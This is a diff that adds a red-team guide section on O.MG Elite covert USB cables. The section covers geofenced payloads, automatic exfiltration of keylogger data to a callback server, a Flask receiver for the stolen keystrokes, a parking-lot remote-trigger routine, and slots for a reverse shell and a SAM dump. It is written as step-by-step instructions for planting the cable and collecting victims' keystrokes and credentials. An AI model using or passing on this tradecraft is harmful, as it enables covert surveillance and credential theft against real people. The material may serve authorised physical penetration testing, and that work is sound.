@@ -757,6 +757,144 @@ REM [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("powershell -enc
 REM Put the output in your DNS TXT record
 ```
 
+## O.MG Elite — Advanced Features
+
+The Elite model (vs Basic) has an extended-range Wi-Fi antenna (100m+), a more capable processor, and firmware features that turn the cable into a persistent remote access implant rather than a one-shot keystroke injector.
+
+### Geofenced Payloads
+
+```
+# Geofencing restricts payload execution to a specific physical location
+# by checking for the presence of nearby Wi-Fi SSIDs before running.
+# The cable scans for SSIDs on plug-in — if the target SSID is not seen,
+# nothing executes. Prevents accidental execution on your own machine
+# and limits payload firing to the target environment.
+
+# Configure in the O.MG web UI:
+# Payloads → [payload slot] → Geofence Settings
+#   SSID: "CorpGuest" (or partial match)
+#   Match type: exact / contains
+#   Action if not matched: do nothing (safest)
+
+# Use cases:
+# - Ensure payload only runs inside the target building's Wi-Fi range
+# - Prevent execution at airport, hotel, or your lab
+# - Multi-target deployment: each cable geofenced to its intended building
+```
+
+### Automatic Keylogger Exfiltration
+
+```
+# The Elite can push captured keystrokes to a remote endpoint automatically
+# without requiring you to connect to the cable's own Wi-Fi AP.
+# This enables long-term implant use — drop the cable, retrieve data remotely.
+
+# Configure in O.MG web UI:
+# Keylogger → Settings → Exfil Target
+#   URL: https://your-callback-server.com/log
+#   Method: POST
+#   Trigger: on disconnect / on interval / on threshold
+
+# The cable connects to a configured Wi-Fi network (set in Wi-Fi Settings)
+# and POSTs the keylogger buffer to your server when triggered.
+
+# Server to receive logs (simple Python):
+# from flask import Flask, request
+# app = Flask(__name__)
+# @app.route('/log', methods=['POST'])
+# def receive():
+#     open('keys.txt','a').write(request.data.decode())
+#     return 'ok', 200
+# app.run(host='0.0.0.0', port=443, ssl_context='adhoc')
+
+# Operational setup:
+# 1. Pre-configure the cable to join the target's Wi-Fi (if known) or a rogue AP
+# 2. The cable associates when the target machine is connected to that SSID
+# 3. Keylog data exfils automatically — you never need physical proximity again
+```
+
+### Remote Trigger via Phone (O.MG App)
+
+```
+# The O.MG iOS/Android app provides a polished interface for managing
+# cables in the field without opening a browser.
+
+# App capabilities:
+# - Connect to cable's Wi-Fi AP
+# - Browse, edit, and trigger payload slots
+# - View keylogger output in real time
+# - Push firmware updates OTA
+# - Configure geofencing and exfil settings
+
+# Extended-range operation (Elite antenna):
+# The Basic cable's Wi-Fi AP reaches ~10m
+# The Elite's internal antenna reaches 100m+ in open air
+# Trigger payloads from a car in the parking lot
+
+# Operational pattern:
+# 1. Social engineer or physically plant cable (charging station, IT closet, desk)
+# 2. Walk away — stay within 100m (parking lot, adjacent office, lobby)
+# 3. Wait for target to plug in cable → watch for LED flash (if enabled)
+# 4. Open O.MG app → connect → execute payload
+# 5. Retrieve keylogger data before leaving area
+```
+
+### Multi-Payload Slot Management
+
+```
+# The O.MG Elite supports multiple independent payload slots
+# Each slot can have different:
+#   - DuckyScript payload
+#   - Geofence rule
+#   - Execution mode (auto / manual / scheduled)
+#   - Attack mode (HID / STORAGE / HID+STORAGE)
+
+# Recommended slot layout:
+# Slot 1: DETECT_READY + minimal recon (hostname, user, IP → webhook)
+#         Auto-execute — fires immediately on any plug
+# Slot 2: Full reverse shell payload
+#         Manual trigger — execute when conditions are right
+# Slot 3: Keylogger enable
+#         Auto-execute — always capture keystrokes
+# Slot 4: SAM dump (HID+STORAGE mode)
+#         Manual trigger — only when admin session confirmed
+
+# Switch active slot remotely via app without physical access
+```
+
+### O.MG Elite vs Basic vs Plug vs Adapter
+
+```
+O.MG Cable Elite
+  Form factor:  Lightning / USB-C / USB-A cable
+  Wi-Fi range:  100m+ (external PCB antenna inside)
+  Keylogger:    Yes
+  Exfil:        Yes (Wi-Fi push)
+  Geofence:     Yes
+  Price:        ~$180
+
+O.MG Cable Basic
+  Form factor:  Lightning / USB-C / USB-A cable
+  Wi-Fi range:  ~10m (internal PCB antenna)
+  Keylogger:    Yes
+  Exfil:        Manual retrieval only
+  Geofence:     Yes (firmware 3.0+)
+  Price:        ~$120
+
+O.MG Plug
+  Form factor:  USB-A plug adapter (wall charger-style)
+  Wi-Fi range:  ~10m
+  Keylogger:    Yes
+  Payload:      Same DuckyScript 3.0 support
+  Use case:     Permanent install in charging port
+
+O.MG Adapter
+  Form factor:  USB-A to USB-A inline adapter (10mm long)
+  Wi-Fi range:  ~10m
+  Use case:     Insert between victim's cable and their device
+                Victim uses their own cable — doesn't need to accept a new one
+```
+
 ## OPSEC Considerations
 
 ```
